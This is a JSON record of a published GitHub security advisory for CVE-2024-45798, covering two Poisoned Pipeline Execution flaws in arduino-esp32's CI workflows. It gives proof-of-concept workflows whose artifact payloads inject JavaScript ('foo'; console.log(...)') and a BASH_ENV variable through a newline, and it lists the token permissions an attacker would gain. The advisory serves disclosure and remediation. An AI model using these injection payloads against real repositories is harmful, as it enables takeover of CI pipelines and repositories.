@@ -1,0 +1,157 @@
+{
+ "author": null,
+ "closed_at": null,
+ "collaborating_teams": null,
+ "collaborating_users": null,
+ "created_at": null,
+ "credits": [
+  {
+   "login": "pwntester",
+   "type": "reporter"
+  },
+  {
+   "login": "lucasssvaz",
+   "type": "remediation_developer"
+  }
+ ],
+ "credits_detailed": [
+  {
+   "state": "accepted",
+   "type": "reporter",
+   "user": {
+    "avatar_url": "https://avatars.githubusercontent.com/u/125701?v=4",
+    "events_url": "https://api.github.com/users/pwntester/events{/privacy}",
+    "followers_url": "https://api.github.com/users/pwntester/followers",
+    "following_url": "https://api.github.com/users/pwntester/following{/other_user}",
+    "gists_url": "https://api.github.com/users/pwntester/gists{/gist_id}",
+    "gravatar_id": "",
+    "html_url": "https://github.com/pwntester",
+    "id": 125701,
+    "login": "pwntester",
+    "node_id": "MDQ6VXNlcjEyNTcwMQ==",
+    "organizations_url": "https://api.github.com/users/pwntester/orgs",
+    "received_events_url": "https://api.github.com/users/pwntester/received_events",
+    "repos_url": "https://api.github.com/users/pwntester/repos",
+    "site_admin": false,
+    "starred_url": "https://api.github.com/users/pwntester/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/pwntester/subscriptions",
+    "type": "User",
+    "url": "https://api.github.com/users/pwntester",
+    "user_view_type": "public"
+   }
+  },
+  {
+   "state": "accepted",
+   "type": "remediation_developer",
+   "user": {
+    "avatar_url": "https://avatars.githubusercontent.com/u/32426024?v=4",
+    "events_url": "https://api.github.com/users/lucasssvaz/events{/privacy}",
+    "followers_url": "https://api.github.com/users/lucasssvaz/followers",
+    "following_url": "https://api.github.com/users/lucasssvaz/following{/other_user}",
+    "gists_url": "https://api.github.com/users/lucasssvaz/gists{/gist_id}",
+    "gravatar_id": "",
+    "html_url": "https://github.com/lucasssvaz",
+    "id": 32426024,
+    "login": "lucasssvaz",
+    "node_id": "MDQ6VXNlcjMyNDI2MDI0",
+    "organizations_url": "https://api.github.com/users/lucasssvaz/orgs",
+    "received_events_url": "https://api.github.com/users/lucasssvaz/received_events",
+    "repos_url": "https://api.github.com/users/lucasssvaz/repos",
+    "site_admin": false,
+    "starred_url": "https://api.github.com/users/lucasssvaz/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/lucasssvaz/subscriptions",
+    "type": "User",
+    "url": "https://api.github.com/users/lucasssvaz",
+    "user_view_type": "public"
+   }
+  }
+ ],
+ "cve_id": "CVE-2024-45798",
+ "cvss": {
+  "score": null,
+  "vector_string": null
+ },
+ "cvss_severities": {
+  "cvss_v3": {
+   "score": null,
+   "vector_string": null
+  },
+  "cvss_v4": {
+   "score": null,
+   "vector_string": null
+  }
+ },
+ "cwe_ids": [
+  "CWE-20",
+  "CWE-78",
+  "CWE-94"
+ ],
+ "cwes": [
+  {
+   "cwe_id": "CWE-20",
+   "name": "Improper Input Validation"
+  },
+  {
+   "cwe_id": "CWE-78",
+   "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+  },
+  {
+   "cwe_id": "CWE-94",
+   "name": "Improper Control of Generation of Code ('Code Injection')"
+  }
+ ],
+ "description": "### Summary\r\n`arduino-esp32` CI is vulnerable to multiple Poisoned Pipeline Execution (PPE) vulnerabilities. This affects this repo and any other that might use these workflows.\r\n\r\n### Code injection in `tests_results.yml` workflow (`GHSL-2024-169`)\r\n\r\nThe [`tests_results` workflow](https://github.com/espressif/arduino-esp32/blob/690bdb511d9f001e2066da2dda2c631a3eee270f/.github/workflows/tests_results.yml) is triggered when the `Wokwi tests` workflows completes:\r\n\r\n```yaml\r\non:\r\n  workflow_run:\r\n    workflows: [\"Wokwi tests\"]\r\n    types:\r\n      - completed\r\n```\r\n\r\nIt then downloads an artifact uploaded by the triggering workflow into the `artifacts/` directory:\r\n\r\n```yaml\r\n- name: Download and Extract Artifacts\r\nuses: dawidd6/action-download-artifact@v6\r\nwith:\r\n  run_id: ${{ github.event.workflow_run.id }}\r\n  path: ./artifacts\r\n```\r\n\r\nAnd read the contents of the artifacts into different Environment Variables:\r\n\r\n````\r\n```yaml\r\n- name: Get original info\r\nrun: |\r\n  original_event=$(cat ./artifacts/parent-artifacts/event.txt)\r\n  original_action=$(cat ./artifacts/parent-artifacts/action.txt)\r\n  original_sha=$(cat ./artifacts/parent-artifacts/sha.txt)\r\n  original_ref=$(cat ./artifacts/parent-artifacts/ref.txt)\r\n  original_conclusion=$(cat ./artifacts/parent-artifacts/conclusion.txt)\r\n  echo \"original_event=$original_event\" >> $GITHUB_ENV\r\n  echo \"original_action=$original_action\" >> $GITHUB_ENV\r\n  echo \"original_sha=$original_sha\" >> $GITHUB_ENV\r\n  echo \"original_ref=$original_ref\" >> $GITHUB_ENV\r\n  echo \"original_conclusion=$original_conclusion\" >> $GITHUB_ENV\r\n````\r\n\r\nSome of the attacker-controlled variables (such as the `original_ref` variable) are later interpolated into a JavaScript script, enabling an attacker to alter the code of the script and execute arbitrary code in the context of a [high-privileged workflow](https://github.com/espressif/arduino-esp32/actions/runs/10005013308/job/27654848223#step:1:17):\r\n\r\n```yaml\r\n- name: Clean up caches\r\nif: always()\r\nuses: actions/github-script@v7\r\nwith:\r\n  script: |\r\n    const ref = '${{ env.original_ref }}';\r\n    ...\r\n\r\n```\r\n\r\n#### PoC\r\n\r\n- Clone the repository\r\n- Edit the `tests_wokwi.yml` workflow.\r\n\r\n```yaml\r\nname: Wokwi tests\r\n\r\non:\r\n  pull_request:\r\n\r\njobs:\r\n  trigger:\r\n    name: Upload artifact\r\n    runs-on: ubuntu-latest\r\n    steps:\r\n      - run: |\r\n          mkdir -p artifacts\r\n          printf \"${{ github.sha }}\" > artifacts/sha.txt\r\n          printf \"pull_request\" > artifacts/event.txt\r\n          printf \"success\" > artifacts/conclusion.txt\r\n          printf \"\" > artifacts/action.txt\r\n          # PAYLOAD\r\n          printf \"foo'; console.log('CODE INJECTION'); //\" > artifacts/ref.txt\r\n```\r\n\r\n- Create a Pull Request with this change.\r\n- Since the modified workflow is triggered on `pull_request`, the attacker Pull Request will trigger it and upon completion will trigger the vulnerable `Publish and clean test results` workflow which will read the malicious artifact and use its contents to modify the JS script.\r\n\r\n#### Impact\r\n\r\nThis issue may lead to a repository takeover since it will grant an attacker a GITHUB_TOKEN with the following permissions:\r\n\r\n```\r\n  Actions: write\r\n  Checks: write\r\n  Contents: write\r\n  Metadata: read\r\n  PullRequests: write\r\n  Statuses: write\r\n```\r\n\r\n#### Remediation\r\n\r\n- Verify the contents of the downloaded artifacts.\r\n- Pass data into the JS script using an Environment Variable and read it from JS using `process.env`\r\n\r\n### Environment Variable injection (`GHSL-2024-170`)\r\n\r\nIn the same workflow/step, the untrusted data from an artifact is redirected to GITHUB_ENV to create a new Environment Variable:\r\n\r\n```yaml\r\n- name: Get original info\r\nrun: |\r\n  original_event=$(cat ./artifacts/parent-artifacts/event.txt)\r\n  original_action=$(cat ./artifacts/parent-artifacts/action.txt)\r\n  original_sha=$(cat ./artifacts/parent-artifacts/sha.txt)\r\n  original_ref=$(cat ./artifacts/parent-artifacts/ref.txt)\r\n  original_conclusion=$(cat ./artifacts/parent-artifacts/conclusion.txt)\r\n  echo \"original_event=$original_event\" >> $GITHUB_ENV\r\n  echo \"original_action=$original_action\" >> $GITHUB_ENV\r\n  echo \"original_sha=$original_sha\" >> $GITHUB_ENV\r\n  echo \"original_ref=$original_ref\" >> $GITHUB_ENV\r\n  echo \"original_conclusion=$original_conclusion\" >> $GITHUB_ENV\r\n```\r\n\r\nThe `$GITHUB_ENV` pointed file is just a regular file where every `KEY=VALUE` will be used to define a new Environment Variable.\r\n\r\nAn attacker can send a malicious `event.txt` file (or any of the other artifacts), with the following content:\r\n\r\n```txt\r\npull_request\r\nBASH_ENV=$(echo \"ENV-VAR INJECTION\")\r\n```\r\n\r\nWhich will result in two Environment Variables being defined:\r\n\r\n- original_event=pull_request\r\n- BASH_ENV=$(echo \"ENV-VAR INJECTION\")\r\n\r\nThe `BASH_ENV` will pollute the bash environment so that next `Run` step will execute the code in the variable.\r\n\r\n#### PoC\r\n\r\n- Clone the repository\r\n- Edit the `tests_wokwi.yml` workflow.\r\n\r\n```yaml\r\nname: Wokwi tests\r\n\r\non:\r\n  pull_request:\r\n\r\njobs:\r\n  trigger:\r\n    name: Upload artifact\r\n    runs-on: ubuntu-latest\r\n    steps:\r\n      - run: |\r\n          mkdir -p artifacts\r\n          printf \"${{ github.sha }}\" > artifacts/sha.txt\r\n          printf \"pull_request\" > artifacts/event.txt\r\n          printf \"success\" > artifacts/conclusion.txt\r\n          printf \"\" > artifacts/action.txt\r\n          # PAYLOAD\r\n          printf \"pull_request\\nBASH_ENV=$(echo 'ENV-VAR INJECTION')\" > artifacts/ref.txt\r\n```\r\n\r\n- Create a Pull Request with this change.\r\n- Since the modified workflow is triggered on `pull_request`, the attacker Pull Request will trigger it and upon completion will trigger the vulnerable `Publish and clean test results` workflow which will read the malicious artifact and use its contents to modify the JS script.\r\n\r\n#### Impact\r\n\r\nThis issue may lead to a repository takeover since it will grant an attacker a GITHUB_TOKEN with the following permissions:\r\n\r\n```\r\n  Actions: write\r\n  Checks: write\r\n  Contents: write\r\n  Metadata: read\r\n  PullRequests: write\r\n  Statuses: write\r\n```\r\n\r\n#### Remediation\r\n\r\n- Verify the contents of the downloaded artifacts.\r\n- Do not allow new lines in the value redirected to GITHUB_ENV\r\n\r\n### Resources\r\n\r\n- [CodeQL for JavaScript - Expression injection in Actions](https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/)\r\n- [Keeping your GitHub Actions and workflows secure Part 2: Untrusted input](https://securitylab.github.com/research/github-actions-untrusted-input/)\r\n- [Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)\r\n",
+ "ghsa_id": "GHSA-h52q-xhg2-6jw8",
+ "html_url": "https://github.com/espressif/arduino-esp32/security/advisories/GHSA-h52q-xhg2-6jw8",
+ "identifiers": [
+  {
+   "type": "GHSA",
+   "value": "GHSA-h52q-xhg2-6jw8"
+  },
+  {
+   "type": "CVE",
+   "value": "CVE-2024-45798"
+  }
+ ],
+ "private_fork": null,
+ "published_at": "2024-09-17T13:55:09Z",
+ "publisher": {
+  "avatar_url": "https://avatars.githubusercontent.com/u/32426024?v=4",
+  "events_url": "https://api.github.com/users/lucasssvaz/events{/privacy}",
+  "followers_url": "https://api.github.com/users/lucasssvaz/followers",
+  "following_url": "https://api.github.com/users/lucasssvaz/following{/other_user}",
+  "gists_url": "https://api.github.com/users/lucasssvaz/gists{/gist_id}",
+  "gravatar_id": "",
+  "html_url": "https://github.com/lucasssvaz",
+  "id": 32426024,
+  "login": "lucasssvaz",
+  "node_id": "MDQ6VXNlcjMyNDI2MDI0",
+  "organizations_url": "https://api.github.com/users/lucasssvaz/orgs",
+  "received_events_url": "https://api.github.com/users/lucasssvaz/received_events",
+  "repos_url": "https://api.github.com/users/lucasssvaz/repos",
+  "site_admin": false,
+  "starred_url": "https://api.github.com/users/lucasssvaz/starred{/owner}{/repo}",
+  "subscriptions_url": "https://api.github.com/users/lucasssvaz/subscriptions",
+  "type": "User",
+  "url": "https://api.github.com/users/lucasssvaz",
+  "user_view_type": "public"
+ },
+ "severity": "critical",
+ "state": "published",
+ "submission": null,
+ "summary": "Multiple Poisoned Pipeline Execution (PPE) vulnerabilities",
+ "updated_at": "2024-09-17T13:55:10Z",
+ "url": "https://api.github.com/repos/espressif/arduino-esp32/security-advisories/GHSA-h52q-xhg2-6jw8",
+ "vulnerabilities": [
+  {
+   "package": {
+    "ecosystem": "actions",
+    "name": "arduino-esp32"
+   },
+   "patched_versions": "Fixed in commit a7cec020df8f1a815bd8dfd2559f51a2216bcf1c",
+   "vulnerable_functions": [],
+   "vulnerable_version_range": "Started in commit 26db8cba32e77050f177e8cb0f879614c57bc5f2"
+  }
+ ],
+ "withdrawn_at": null
+}
